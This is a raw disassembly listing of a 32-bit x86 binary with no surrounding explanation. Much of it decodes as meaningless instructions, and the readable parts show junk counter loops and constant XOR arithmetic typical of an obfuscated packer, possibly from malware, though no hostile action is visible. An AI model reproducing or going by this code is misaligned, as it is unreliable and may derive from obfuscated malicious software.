  404c1c:	lock stos DWORD PTR es:[edi],eax
  404c1e:	mov    ebp,0xc4ed6900
  404c23:	(bad)  
  404c24:	jmp    0x404bc0
  404c26:	mov    eax,0x2b358f76
  404c2b:	add    eax,0x4f72109e
  404c30:	repnz lods al,BYTE PTR ds:[esi]
  404c32:	aam    0xd2
  404c34:	dec    ebx
  404c35:	push   0xffffff93
  404c37:	or     DWORD PTR [ebx+0x13b5ed77],ebx
  404c3d:	lods   eax,DWORD PTR ds:[esi]
  404c3e:	sbb    dh,BYTE PTR [ecx+0x8]
  404c41:	dec    eax
  404c42:	jno    0x404c2c
  404c44:	sar    ch,0x7e
  404c47:	ins    BYTE PTR es:[edi],dx
  404c48:	scas   eax,DWORD PTR es:[edi]
  404c49:	hlt    
  404c4a:	xchg   esp,eax
  404c4b:	pushf  
  404c4c:	frstor [ebx+0x5ea966d6]
  404c52:	and    BYTE PTR [edx-0x24],cl
  404c55:	out    0x18,al
  404c57:	cmp    BYTE PTR [ecx+0x4d],0xf3
  404c5b:	retf   0x9f4c
  404c5e:	sar    esi,cl
  404c60:	inc    ebx
  404c61:	pop    ebx
  404c62:	ds ret 0x38b9
  404c66:	pop    es
  404c67:	mov    ch,0x70
  404c69:	(bad)  
  404c6b:	add    DWORD PTR [edi],0x56
  404c6e:	outs   dx,BYTE PTR ds:[esi]
  404c6f:	inc    esp
  404c70:	jno    0x404cde
  404c72:	xchg   ebp,eax
  404c73:	lahf   
  404c74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c75:	and    BYTE PTR [ecx+ebx*8-0x78],bh
  404c79:	or     eax,0x68f81f22
  404c7e:	mov    eax,0x81e292b6
  404c83:	shr    DWORD PTR [edx+0x134dc2bf],1
  404c89:	mov    cl,0x96
  404c8b:	inc    ebx
  404c8c:	mov    dh,0xf9
  404c8e:	ror    esp,0xd9
  404c91:	and    esp,DWORD PTR [eax-0x7002898f]
  404c97:	das    
  404c98:	imul   eax,ecx,0x62
  404c9b:	add    dl,dh
  404c9d:	ret    0xead1
  404ca0:	mov    eax,0xb4f718e3
  404ca5:	sbb    DWORD PTR [edx+eiz*2-0x7c49f9ff],esi
  404cac:	outs   dx,DWORD PTR ds:[esi]
  404cad:	push   ebx
  404cae:	stos   DWORD PTR es:[edi],eax
  404caf:	repz cmp eax,0x34553357
  404cb5:	jg     0x404c9a
  404cb7:	add    al,0x21
  404cb9:	jmp    0x404c5f
  404cbb:	mov    eax,ds:0xc48c1e56
  404cc0:	adc    ch,ch
  404cc2:	and    dh,BYTE PTR [esi+0xbb4cf6a]
  404cc8:	(bad)  
  404cc9:	outs   dx,BYTE PTR ds:[esi]
  404cca:	sbb    edx,DWORD PTR [edi+0x3e549a80]
  404cd0:	std    
  404cd1:	xchg   esp,eax
  404cd2:	ins    BYTE PTR es:[edi],dx
  404cd3:	fadd   QWORD PTR [edx+0x6d0d8b06]
  404cd9:	xor    BYTE PTR [edi+0x1d06ad5d],ah
  404cdf:	xchg   ebx,eax
  404ce0:	sub    ebx,ebx
  404ce2:	jb     0x404c9f
  404ce4:	sub    ah,BYTE PTR [esp+ebp*2]
  404ce7:	jne    0x404d55
  404ce9:	mov    eax,ecx
  404ceb:	pop    ebp
  404cec:	ret    0x18
  404cef:	push   ebp
  404cf0:	mov    ebp,esp
  404cf2:	push   ecx
  404cf3:	add    DWORD PTR ds:0x4292b1,edx
  404cf9:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  404d00:	mov    eax,DWORD PTR [ebp-0x4]
  404d03:	and    ecx,ecx
  404d05:	mov    edx,DWORD PTR [ebp+0x10]
  404d08:	mov    DWORD PTR ds:0x4292d5,0x4d89
  404d12:	mov    ecx,0x7510857
  404d17:	xor    eax,ecx
  404d19:	add    eax,0x32729e
  404d1e:	jmp    0x404e84
  404d23:	jne    0x404d9b
  404d25:	xchg   DWORD PTR [ebx+ebx*4],ebx
  404d28:	mov    eax,ds:0x71892dbd
  404d2d:	arpl   WORD PTR [eax],ax
  404d2f:	mov    dh,0x45
  404d31:	jo     0x404d0f
  404d33:	adc    dl,BYTE PTR ds:0x7f377c7c
  404d39:	jl     0x404db7
  404d3b:	adc    eax,0x54bff13d
  404d40:	mov    edx,0x36819c2d
  404d45:	ss mov edx,0x6023da1e
  404d4b:	aas    
  404d4c:	mov    ebx,0xa6fd624a
  404d51:	and    al,0x28
  404d53:	test   eax,0x49677b32
  404d58:	cmp    al,0x6f
  404d5a:	cmp    eax,0x4fe71960
  404d5f:	unpckhps xmm1,XMMWORD PTR [edx+0x15a773e9]
  404d66:	clc    
  404d67:	cmp    BYTE PTR [ecx-0x3e],al
  404d6a:	and    DWORD PTR [edi+ebx*4],esp
  404d6d:	mov    ds:0x62a853d8,al
  404d72:	in     al,0x45
  404d74:	jno    0x404d68
  404d76:	jle    0x404d19
  404d78:	es push ss
  404d7a:	mov    eax,0xcf0cf8e4
  404d7f:	mov    ah,0x2d
  404d81:	ss pop ss
  404d83:	mov    WORD PTR ds:0x7dceb3d6,?
  404d89:	sub    esp,DWORD PTR [eax+esi*4]
  404d8c:	sbb    ecx,DWORD PTR [ebp-0x22864ce9]
  404d92:	xchg   esi,eax
  404d93:	popf   
  404d94:	rcr    DWORD PTR [ebx],cl
  404d96:	loope  0x404d81
  404d98:	nop
  404d99:	pop    ebp
  404d9a:	clc    
  404d9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d9c:	sub    cl,BYTE PTR [eax-0x657a094a]
  404da2:	sbb    BYTE PTR [edi],bl
  404da4:	push   cs
  404da5:	dec    esp
  404da6:	stc    
  404da7:	(bad)  
  404da8:	in     eax,0xd1
  404daa:	mov    DWORD PTR [edi+0x46],eax
  404dad:	xchg   ebx,eax
  404dae:	inc    ebx
  404daf:	aas    
  404db0:	out    dx,eax
  404db1:	cmc    
  404db2:	pop    eax
  404db3:	fmul   QWORD PTR [eax-0x9]
  404db6:	xchg   edx,eax
  404db7:	adc    dh,bh
  404db9:	mov    eax,0x73159a23
  404dbe:	pop    ecx
  404dbf:	arpl   si,cx
  404dc1:	dec    esp
  404dc2:	sbb    ebx,DWORD PTR ds:0x5b80f8d1
  404dc8:	stos   DWORD PTR es:[edi],eax
  404dc9:	mov    bl,0xf5
  404dcb:	cld    
  404dcc:	add    eax,0xe569a6bc
  404dd1:	lea    esp,[ebp+0x1c9dd784]
  404dd7:	in     eax,0x47
  404dd9:	push   edi
  404dda:	ja     0x404e21
  404ddc:	mov    ecx,0xf6214f16
  404de1:	add    cl,BYTE PTR [edx-0x2a]
  404de4:	mov    eax,ds:0x1f3fb7b
  404de9:	sub    esi,ebp
  404deb:	mov    ecx,0x28f16f97
  404df0:	sbb    BYTE PTR [edx+0xa],0x18
  404df4:	mov    al,0xa3
  404df6:	lea    edi,[eax+0x1b]
  404df9:	xchg   ecx,eax
  404dfa:	stc    
  404dfb:	mov    al,0xec
  404dfd:	push   es
  404dfe:	jl     0x404e4a
  404e00:	ss scas al,BYTE PTR es:[edi]
  404e02:	sbb    dh,dl
  404e04:	pop    edi
  404e05:	aas    
  404e06:	push   ds
  404e07:	mov    esi,?
  404e09:	xchg   ebx,eax
  404e0a:	loop   0x404e15
  404e0c:	or     BYTE PTR [ebx],dl
  404e0e:	aad    0x94
  404e10:	push   ecx
  404e11:	(bad)  
  404e12:	mov    ds:0x4171156a,eax
  404e17:	inc    esp
  404e18:	mov    edx,DWORD PTR [eax-0x5bb1b4a1]
  404e1e:	int    0xda
  404e20:	or     DWORD PTR [esi-0xbf9def7],0x6e
  404e27:	into   
  404e28:	mov    ebx,0xf5344118
  404e2d:	out    dx,al
  404e2e:	pushf  
  404e2f:	adc    ch,al
  404e31:	dec    esi
  404e32:	cmp    edx,ebp
  404e34:	out    dx,al
  404e35:	xchg   esi,eax
  404e36:	or     edx,DWORD PTR [eax+0x78910ecb]
  404e3c:	inc    ecx
  404e3d:	stos   BYTE PTR es:[edi],al
  404e3e:	iret   
  404e3f:	cmp    ah,0x46
  404e42:	imul   esi,DWORD PTR [ecx-0x6d091cff],0x6d
  404e49:	jl     0x404e59
  404e4b:	xchg   DWORD PTR [edi-0xc],edi
  404e4e:	mov    ah,0xec
  404e50:	mov    ds:0x9c196751,eax
  404e55:	or     BYTE PTR [eax],dl
  404e57:	loope  0x404e7b
  404e59:	push   ss
  404e5a:	inc    ebp
  404e5b:	cmp    esi,DWORD PTR [edi]
  404e5d:	sbb    eax,edx
  404e5f:	mov    esp,ebp
  404e61:	dec    edi
  404e62:	repz in eax,dx
  404e64:	jno    0x404eb1
  404e66:	and    al,0x27
  404e68:	sub    ebx,DWORD PTR gs:[ebx+0x2a889839]
  404e6f:	xor    al,BYTE PTR es:[eax-0x68]
  404e73:	es int3 
  404e75:	pushf  
  404e76:	add    DWORD PTR [edi],edi
  404e78:	pop    ebp
  404e79:	inc    ecx
  404e7a:	lea    edi,[ecx+ebp*4]
  404e7d:	jbe    0x404e85
  404e7f:	in     al,dx
  404e80:	in     al,dx
  404e81:	jo     0x404e3f
  404e83:	mov    ecx,0x1d090289
  404e88:	test   eax,0x8b004292
  404e8d:	inc    ebp
  404e8e:	adc    al,0xf7
  404e90:	ror    BYTE PTR [ebx+0x42891055],cl
  404e96:	add    al,0x8b
  404e98:	inc    ebp
  404e99:	sbb    BYTE PTR [ecx+0x42c88e1d],al
  404e9f:	add    BYTE PTR [edx+ecx*1+0x558b0000],dh
  404ea6:	adc    BYTE PTR [ecx-0x2fd4f7be],cl
  404eac:	mov    eax,DWORD PTR [ebp+0x1c]
  404eaf:	mov    edx,DWORD PTR ds:0x4275b0
  404eb5:	and    DWORD PTR ds:0x427594,edx
  404ebb:	jmp    0x405021
  404ec0:	fdiv   DWORD PTR [ebx+0x2e]
  404ec3:	dec    esp
  404ec4:	stc    
  404ec5:	gs jp  0x404e53
  404ec8:	jg     0x404e7d
  404eca:	pushf  
  404ecb:	mov    ecx,0x14593bd
  404ed0:	in     eax,dx
  404ed1:	adc    al,0x7c
  404ed3:	jl     0x404f0c
  404ed5:	jg     0x404f53
  404ed7:	jl     0x404e7f
  404ed9:	sar    BYTE PTR [edi+0x2e],cl
  404edc:	lods   eax,DWORD PTR ds:[esi]
  404edd:	mov    DWORD PTR [esi],esp
  404edf:	adc    DWORD PTR [edx],esi
  404ee1:	push   es
  404ee2:	bound  eax,QWORD PTR [ebp+ebx*2-0x156600bf]
  404ee9:	in     al,0x65
  404eeb:	mov    al,ds:0xdddc6f73
  404ef0:	cmp    DWORD PTR [edi-0x470ed7c6],edi
  404ef6:	mov    ?,WORD PTR [ebp-0xc]
  404ef9:	sbb    al,0xd5
  404efb:	ror    BYTE PTR [ecx+0x2823efba],cl
  404f01:	es test eax,0x526a0cd9
  404f07:	ret    0x6847
  404f0a:	sbb    DWORD PTR [eax-0x458ffa58],eax
  404f10:	and    DWORD PTR [eax+0x71c04c4a],edi
  404f16:	push   esp
  404f17:	lea    edx,[ebx]
  404f19:	clc    
  404f1a:	xchg   edi,eax
  404f1b:	mov    WORD PTR [edi],gs
  404f1d:	sbb    ecx,DWORD PTR [ebx-0x1f2f3398]
  404f23:	ds jnp 0x404ece
  404f26:	xchg   esi,eax
  404f27:	inc    ecx
  404f28:	and    ah,dh
  404f2a:	test   BYTE PTR [esi+0x56],cl
  404f2d:	cmp    al,0x17
  404f2f:	fs xchg esp,eax
  404f31:	push   ebp
  404f32:	inc    ebx
  404f33:	mov    al,ds:0x28103c16
  404f38:	cmp    eax,DWORD PTR [ebx]
  404f3a:	into   
  404f3b:	xchg   edx,eax
  404f3c:	mov    bl,0x49
  404f3e:	sub    al,0x26
  404f40:	daa    
  404f41:	add    cl,BYTE PTR [ecx-0x69c39f65]
  404f47:	out    0x6c,al
  404f49:	je     0x404ed8
  404f4b:	pop    ss
  404f4c:	dec    edx
  404f4d:	rcl    DWORD PTR [edx],cl
  404f4f:	(bad)  
  404f50:	fadd   DWORD PTR [esi+0x61]
  404f53:	stos   DWORD PTR es:[edi],eax
  404f54:	fcom   st(5)
  404f56:	sysenter 
  404f58:	push   cs
  404f59:	mov    esi,edi
  404f5b:	repz (bad) 
  404f5d:	call   0xea12:0xc88a8266
  404f64:	add    BYTE PTR [ebx+0x1745a78c],0x5c
  404f6b:	adc    eax,0xaa8e6a3a
  404f70:	ret    0x8631
  404f73:	jbe    0x404f1f
  404f75:	imul   esp,DWORD PTR [edi-0x36],0x2ae69034
  404f7c:	mov    edx,0xb9aaa1b7
  404f81:	cwde   
  404f82:	dec    edx
  404f83:	(bad)  
  404f84:	mov    eax,0xcd9ffa42
  404f89:	xor    DWORD PTR [edx+eiz*8+0x8],0xffffff93
  404f8e:	ds daa 
  404f90:	or     dh,bl
  404f92:	call   0x62894e8f
  404f97:	in     eax,dx
  404f98:	add    dl,BYTE PTR [esi+0x63]
  404f9b:	stos   BYTE PTR es:[edi],al
  404f9c:	ds cld 
  404f9e:	cmp    al,0xde
  404fa0:	jmp    FWORD PTR [ebx]
  404fa2:	lds    ebp,FWORD PTR [edi]
  404fa4:	fild   WORD PTR [esi]
  404fa6:	arpl   WORD PTR [ecx-0x67037ec8],dx
  404fac:	cdq    
  404fad:	mov    edi,0xdbcd27c4
  404fb2:	jmp    0x404f8d
  404fb4:	iret   
  404fb5:	jne    0x404f5d
  404fb7:	pop    ds
  404fb8:	jns    0x404fa3
  404fba:	lock jns 0x404ff2
  404fbd:	pop    edx
  404fbe:	ret    0x690d
  404fc1:	cmp    al,0x58
  404fc3:	int    0xb3
  404fc5:	test   BYTE PTR [ebx],ch
  404fc7:	and    eax,0xe706f3c5
  404fcc:	or     eax,0x150c62ae
  404fd1:	pop    esp
  404fd2:	lea    esi,[esi-0x34]
  404fd5:	mov    esi,0x4cf07b42
  404fda:	outs   dx,BYTE PTR ds:[esi]
  404fdb:	mov    ch,0x47
  404fdd:	retf   
  404fde:	(bad)  
  404fdf:	scas   al,BYTE PTR es:[edi]
  404fe0:	pop    ebx
  404fe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fe2:	arpl   WORD PTR [ebp+0x2edb0fb0],sp
  404fe8:	sbb    eax,0xd844a72
  404fed:	sti    
  404fee:	outs   dx,DWORD PTR ds:[esi]
  404fef:	lea    eax,[ebp+eiz*4+0x3e]
  404ff3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ff4:	sbb    DWORD PTR [ecx-0x10a52976],esi
  404ffa:	jecxz  0x40504c
  404ffc:	fisubr WORD PTR [edx+0x6fd529e]
  405002:	mov    ecx,0x4721d2d7
  405007:	push   0x3c5d0aa8
  40500c:	mov    dh,0x75
  40500e:	fbld   TBYTE PTR [edi+ecx*4]
  405011:	mov    ebp,DWORD PTR [edx+0x35]
  405014:	test   BYTE PTR [esi+0x3b],dl
  405017:	cmp    eax,0xfd2a8330
  40501c:	ficomp WORD PTR [edx-0x74098b26]
  405022:	push   ebp
  405023:	adc    BYTE PTR [ecx+0x1d110c42],cl
  405029:	(bad)  
  40502b:	inc    edx
  40502c:	add    BYTE PTR [ebx+0x1d812045],cl
  405032:	cwde   
  405033:	jne    0x405077
  405035:	add    bl,bh
  405037:	dec    edi
  405038:	add    BYTE PTR [eax],al
  40503a:	jmp    0x4051a0
  40503f:	jno    0x40503e
  405041:	xlat   BYTE PTR ds:[ebx]
  405042:	sti    
  405043:	sti    
  405044:	std    
  405045:	add    eax,0xd7a6c1fd
  40504a:	mov    dl,0xa
  40504c:	dec    ebp
  40504d:	loop   0x40506f
  40504f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405050:	pop    ss
  405051:	jl     0x4050cf
  405053:	aaa    
  405054:	jg     0x4050d2
  405056:	jl     0x405035
  405058:	mov    bl,0x42
  40505a:	clc    
  40505b:	mov    al,0xe3
  40505d:	cwde   
  40505e:	jp     0x40506b
  405060:	pop    eax
  405061:	push   ebx
  405062:	bound  edx,QWORD PTR [edx]
  405064:	push   esi
  405065:	loopne 0x405065
  405067:	in     eax,0xf7
  405069:	xor    BYTE PTR [edi+0x6b3a6518],ch
  40506f:	add    BYTE PTR [edx+0x60ff99],ah
  405075:	push   ebx
  405076:	and    esi,esp
  405078:	aad    0x9
  40507a:	into   
  40507b:	mov    ebx,edi
  40507d:	push   0x1c
  40507f:	push   0x49af1472
  405084:	imul   eax,ebp,0xd1fbcdb9
  40508a:	out    0x49,al
  40508c:	jb     0x40508b
  40508e:	adc    al,BYTE PTR [ecx+eiz*2]
  405091:	mov    eax,ds:0x8250817e
  405096:	inc    ebp
  405097:	dec    edi
  405098:	mov    cl,0x89
  40509a:	adc    eax,0xe308cb21
  40509f:	mov    eax,0x8357f4a5
  4050a4:	mov    eax,ds:0xf644f41c
  4050a9:	cwde   
  4050aa:	sub    ch,BYTE PTR [ecx+ebx*4]
  4050ad:	or     DWORD PTR [esi+0x0],edi
  4050b0:	push   0xfffffffc
  4050b2:	cs sahf 
  4050b4:	push   ebp
  4050b5:	jp     0x405114
  4050b7:	daa    
  4050b8:	mov    ebp,0x73bcf261
  4050bd:	adc    ch,BYTE PTR [edi+0x13a19c00]
  4050c3:	inc    eax
  4050c4:	loopne 0x4050c5
  4050c6:	popf   
  4050c7:	sub    ecx,DWORD PTR [eax]
  4050c9:	dec    BYTE PTR [edx+0x4c]
  4050cc:	add    al,0x99
  4050ce:	or     cl,BYTE PTR [edi-0x7589a0b1]
  4050d4:	loop   0x405120
  4050d6:	fdivp  st(6),st
  4050d8:	loope  0x4050f2
  4050da:	or     edi,ebp
  4050dc:	cmp    eax,0xeb7873b
  4050e1:	scas   eax,DWORD PTR es:[edi]
  4050e2:	sbb    al,bl
  4050e4:	adc    BYTE PTR [eax-0x19f11313],bl
  4050ea:	cs in  al,dx
  4050ec:	jne    0x4050f7
  4050ee:	fdivr  QWORD PTR [ebx]
  4050f0:	jge    0x4050e0
  4050f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050f3:	mov    edi,0x5a75bd3d
  4050f8:	je     0x4050c4
  4050fa:	pop    eax
  4050fb:	scas   eax,DWORD PTR es:[edi]
  4050fc:	mov    esi,0x7c3e368d
  405101:	lods   eax,DWORD PTR ds:[esi]
  405102:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405103:	mov    eax,ds:0xcdd7d128
  405108:	xchg   BYTE PTR [edx],bh
  40510a:	mov    bh,0x59
  40510c:	xor    eax,0x6fe25869
  405111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405112:	cmp    BYTE PTR [ecx+eax*1],0xd0
  405116:	shl    dl,1
  405118:	dec    esi
  405119:	ret    0xd4e5
  40511c:	bound  eax,QWORD PTR [ebx-0x4c]
  40511f:	mov    dl,0x15
  405121:	add    ah,BYTE PTR [edx-0x63]
  405124:	in     al,dx
  405125:	and    edi,DWORD PTR [esi-0x540ee50b]
  40512b:	ret    0x90a9
  40512e:	push   cs
  40512f:	mov    esp,0x55a862c9
  405134:	add    eax,0x58bf8d41
  405139:	or     cl,BYTE PTR [ebx+ecx*1+0x42]
  40513d:	(bad)  
  40513e:	pop    ds
  40513f:	(bad)  
  405141:	jle    0x405142
  405143:	test   eax,0xdf444a0
  405148:	ud0    esp,DWORD PTR [esi]
  40514b:	dec    ebp
  40514c:	call   FWORD PTR [edi+0x28]
  40514f:	fs mov dh,0x7
  405152:	loop   0x40519b
  405154:	lods   al,BYTE PTR ds:[esi]
  405155:	imul   edi,DWORD PTR [eax+0x3059a395],0xffffffdd
  40515c:	sbb    BYTE PTR [ebp-0x4a763f],0x97
  405163:	sub    eax,0x8741f4e6
  405168:	cmp    esp,ebx
  40516a:	inc    esp
  40516b:	add    ch,BYTE PTR [ecx+0x1f]
  40516e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40516f:	inc    edx
  405170:	push   esp
  405171:	shr    DWORD PTR [esi+ecx*8],1
  405174:	jbe    0x405162
  405176:	ss add edi,edi
  405179:	out    0xa6,al
  40517b:	frstor [eax-0x12505202]
  405181:	out    dx,al
  405182:	xchg   ebx,eax
  405183:	add    dh,0x7c
  405186:	xchg   esi,eax
  405187:	cdq    
  405188:	(bad)  
  405189:	mov    ds:0x24181d1b,al
  40518e:	add    al,0xb1
  405190:	adc    dl,BYTE PTR [ecx+0x4e]
  405193:	retf   
  405194:	push   edx
  405195:	adc    al,0xc3
  405197:	test   eax,0x42276f0d
  40519c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40519d:	cmp    ebx,DWORD PTR [ecx+0x10558b04]
  4051a3:	mov    DWORD PTR [edx+0x10],eax
  4051a6:	mov    eax,eax
  4051a8:	mov    eax,DWORD PTR [ebp+0x14]
  4051ab:	test   eax,eax
  4051ad:	mov    eax,DWORD PTR [ebp+0x8]
  4051b0:	jne    0x4051b9
  4051b6:	mov    eax,DWORD PTR [ebp+0xc]
  4051b9:	xor    eax,ecx
  4051bb:	add    eax,0x32729e
  4051c0:	leave  
  4051c1:	ret    0x1c
  4051c4:	push   ebp
  4051c5:	mov    ebp,esp
  4051c7:	sub    esp,0x10c
  4051cd:	adc    DWORD PTR ds:0x427cff,0x42c892
  4051d7:	push   ebx
  4051d8:	push   esi
  4051d9:	push   edi
  4051da:	push   0x409348
  4051df:	adc    DWORD PTR ds:0x4275a0,0x3f8f
  4051e9:	call   DWORD PTR ds:0x427cab
  4051ef:	test   eax,eax
  4051f1:	mov    DWORD PTR ds:0x427594,0x1688
  4051fb:	je     0x405208
  405201:	xor    eax,eax
  405203:	jmp    0x4063e6
  405208:	and    DWORD PTR ds:0x4292a5,0x4292c9
  405212:	push   0x4092b4
  405217:	adc    DWORD PTR ds:0x4292cd,0x1b3a
  405221:	call   DWORD PTR ds:0x427a33
  405227:	and    DWORD PTR ds:0x427d07,0x4292c5
  405231:	test   ax,ax
  405234:	mov    DWORD PTR ds:0x42c882,0x6514
  40523e:	je     0x40526d
  405244:	push   0x3546
  405249:	push   0x65890909
  40524e:	or     DWORD PTR ds:0x42c882,0x42c89a
  405258:	call   DWORD PTR ds:0x4279ef
  40525e:	mov    DWORD PTR ds:0x4292dd,0x79a2
  405268:	jmp    0x4063e6
  40526d:	mov    ecx,0xf89c8535
  405272:	mov    DWORD PTR [ebp-0x20],ecx
  405275:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  40527c:	sub    ebx,edx
  40527e:	lea    eax,[ebp-0x58]
  405281:	neg    esi
  405283:	mov    DWORD PTR [ebp-0x60],eax
  405286:	and    DWORD PTR ds:0x4292c1,0x0
  405290:	mov    edx,DWORD PTR ds:0x4292c1
  405296:	inc    edx
  405297:	mov    DWORD PTR ds:0x4292c1,edx
  40529d:	cmp    DWORD PTR ds:0x4292c1,0x1e
  4052a4:	jne    0x4052bd
  4052aa:	push   0x63b5
  4052af:	push   DWORD PTR [ebp-0x28]
  4052b2:	push   0x5536
  4052b7:	call   DWORD PTR ds:0x427a97
  4052bd:	cmp    DWORD PTR ds:0x4292c1,0x10
  4052c4:	jb     0x405290
  4052ca:	movzx  ebx,WORD PTR ds:0x42c88a
  4052d1:	adc    DWORD PTR ds:0x4292c1,ebx
  4052d7:	lea    eax,[ebp-0x50]
  4052da:	sbb    ebx,DWORD PTR ds:0x4275b0
  4052e0:	mov    DWORD PTR [ebp-0x10],eax
  4052e3:	mov    eax,ds:0x4091a0
  4052e8:	sbb    ebx,esi
  4052ea:	mov    eax,DWORD PTR [eax+0x1c8]
  4052f0:	and    DWORD PTR ds:0x4275a4,0x0
  4052fa:	mov    esi,DWORD PTR ds:0x4275a4
  405300:	inc    esi
  405301:	mov    DWORD PTR ds:0x4275a4,esi
  405307:	cmp    DWORD PTR ds:0x4275a4,0x4
  40530e:	jne    0x40531f
  405314:	push   0x1257
  405319:	call   DWORD PTR ds:0x4279d7
  40531f:	cmp    DWORD PTR ds:0x4275a4,0x3
  405326:	jne    0x405339
  40532c:	mov    esi,DWORD PTR ds:0x4275a4
  405332:	inc    esi
  405333:	mov    DWORD PTR ds:0x4275a4,esi
  405339:	cmp    DWORD PTR ds:0x4275a4,0x1a
  405340:	jb     0x4052fa
  405346:	sbb    esi,DWORD PTR ds:0x4292dd
  40534c:	mov    eax,DWORD PTR [eax]
  40534e:	mov    edx,DWORD PTR [ebp-0x10]
  405351:	sbb    ebx,0x4bc4
  405357:	mov    esi,0x7510857
  40535c:	xor    eax,esi
  40535e:	and    DWORD PTR ds:0x4292c5,0x0
  405368:	jmp    0x40537c
  40536d:	xor    ebx,ebx
  40536f:	add    ebx,DWORD PTR ds:0x4292c5
  405375:	inc    ebx
  405376:	mov    DWORD PTR ds:0x4292c5,ebx
  40537c:	cmp    DWORD PTR ds:0x4292c5,0x10
  405383:	jae    0x4053d4
  405389:	cmp    DWORD PTR ds:0x4292c5,0xb
  405390:	jne    0x4053af
  405396:	push   0x1343
  40539b:	push   DWORD PTR [ebp-0xc]
  40539e:	push   DWORD PTR [ebp-0x14]
  4053a1:	push   0x4e35
  4053a6:	push   DWORD PTR [ebp-0x28]
  4053a9:	call   DWORD PTR ds:0x4278f7
  4053af:	cmp    DWORD PTR ds:0x4292c5,0xa
  4053b6:	jne    0x4053c9
  4053bc:	mov    ebx,DWORD PTR ds:0x4292c5
  4053c2:	inc    ebx
  4053c3:	mov    DWORD PTR ds:0x4292c5,ebx
  4053c9:	jmp    0x40536d
  4053ce:	adc    ebx,DWORD PTR ds:0x427598
  4053d4:	mov    ebx,0x32729e
  4053d9:	sbb    DWORD PTR ds:0x42c89e,0x427d13
  4053e3:	add    eax,ebx
  4053e5:	mov    DWORD PTR ds:0x4292b9,0x4aac
  4053ef:	mov    DWORD PTR [edx],eax
  4053f1:	mov    eax,ds:0x409464
  4053f6:	mov    DWORD PTR ds:0x42c882,0x6078
  405400:	cmp    eax,0x23d14057
  405405:	mov    eax,DWORD PTR [ebp-0x18]
  405408:	mov    DWORD PTR ds:0x4292dd,0x3967
  405412:	je     0x405434
  405418:	mov    ecx,DWORD PTR [ebp-0x20]
  40541b:	xor    eax,esi
  40541d:	add    eax,ebx
  40541f:	imul   eax,ecx
  405422:	mov    DWORD PTR ds:0x4292c5,0x1be9
  40542c:	mov    DWORD PTR [ebp-0x20],eax
  40542f:	jmp    0x405ffd
  405434:	xor    eax,esi
  405436:	add    eax,ebx
  405438:	mov    DWORD PTR ds:0x42c886,0x19
  405442:	cmp    DWORD PTR ds:0x42c886,0x0
  405449:	je     0x405480
  40544f:	cmp    DWORD PTR ds:0x42c886,0x23
  405456:	jne    0x405468
  40545c:	push   DWORD PTR [ebp-0x20]
  40545f:	push   DWORD PTR [ebp-0x24]
  405462:	call   DWORD PTR ds:0x427a9b
  405468:	mov    edx,DWORD PTR ds:0x42c886
  40546e:	dec    edx
  40546f:	mov    DWORD PTR ds:0x42c886,edx
  405475:	jmp    0x405442
  40547a:	or     edx,0x41a6
  405480:	mov    ds:0x4092b0,eax
  405485:	mov    eax,DWORD PTR [ebp-0x20]
  405488:	add    edx,DWORD PTR ds:0x42c89a
  40548e:	xor    eax,esi
  405490:	and    edx,0x2762
  405496:	add    eax,ebx
  405498:	and    DWORD PTR ds:0x42c88e,0x0
  4054a2:	jmp    0x4054b4
  4054a7:	mov    edx,DWORD PTR ds:0x42c88e
  4054ad:	inc    edx
  4054ae:	mov    DWORD PTR ds:0x42c88e,edx
  4054b4:	cmp    DWORD PTR ds:0x42c88e,0x1d
  4054bb:	jae    0x405501
  4054c1:	cmp    DWORD PTR ds:0x42c88e,0xd
  4054c8:	jne    0x4054dc
  4054ce:	push   DWORD PTR [ebp-0x18]
  4054d1:	push   0x590a
  4054d6:	call   DWORD PTR ds:0x427a9f
  4054dc:	cmp    DWORD PTR ds:0x42c88e,0xc
  4054e3:	jne    0x4054f6
  4054e9:	mov    edx,DWORD PTR ds:0x42c88e
  4054ef:	inc    edx
  4054f0:	mov    DWORD PTR ds:0x42c88e,edx
  4054f6:	jmp    0x4054a7
  4054fb:	add    DWORD PTR ds:0x427d13,edi
  405501:	mov    ds:0x409464,eax
  405506:	and    DWORD PTR ds:0x4292b9,0x0
  405510:	jmp    0x405522
  405515:	mov    edx,DWORD PTR ds:0x4292b9
  40551b:	inc    edx
  40551c:	mov    DWORD PTR ds:0x4292b9,edx
  405522:	cmp    DWORD PTR ds:0x4292b9,0x19
  405529:	jae    0x4055c8
  40552f:	cmp    DWORD PTR ds:0x4292b9,0x8
  405536:	jne    0x40554a
  40553c:	push   0x4277cc
  405541:	push   DWORD PTR [ebp-0x28]
  405544:	call   DWORD PTR ds:0x427aa3
  40554a:	cmp    DWORD PTR ds:0x4292b9,0x7
  405551:	jne    0x405566
  405557:	xor    edx,edx
  405559:	xor    edx,DWORD PTR ds:0x4292b9
  40555f:	inc    edx
  405560:	mov    DWORD PTR ds:0x4292b9,edx
  405566:	jmp    0x405515
  40556b:	mov    DWORD PTR ds:0x42759c,0x10
  405575:	cmp    DWORD PTR ds:0x42759c,0x0
  40557c:	je     0x4055c8
  405582:	cmp    DWORD PTR ds:0x42759c,0x1f
  405589:	jne    0x4055b2
  40558f:	push   0x76d3
  405594:	push   DWORD PTR [ebp-0x10]
  405597:	push   DWORD PTR [ebp-0x28]
  40559a:	push   DWORD PTR [ebp-0x14]
  40559d:	push   0x4ba5
  4055a2:	push   0x42782a
  4055a7:	push   0x400000
  4055ac:	call   DWORD PTR ds:0x4278fb
  4055b2:	mov    eax,ds:0x42759c
  4055b7:	dec    eax
  4055b8:	mov    ds:0x42759c,eax
  4055bd:	jmp    0x405575
  4055c2:	xor    DWORD PTR ds:0x427d0b,edx
  4055c8:	mov    eax,DWORD PTR [ebp-0x18]
  4055cb:	mov    edx,DWORD PTR ds:0x4092b0
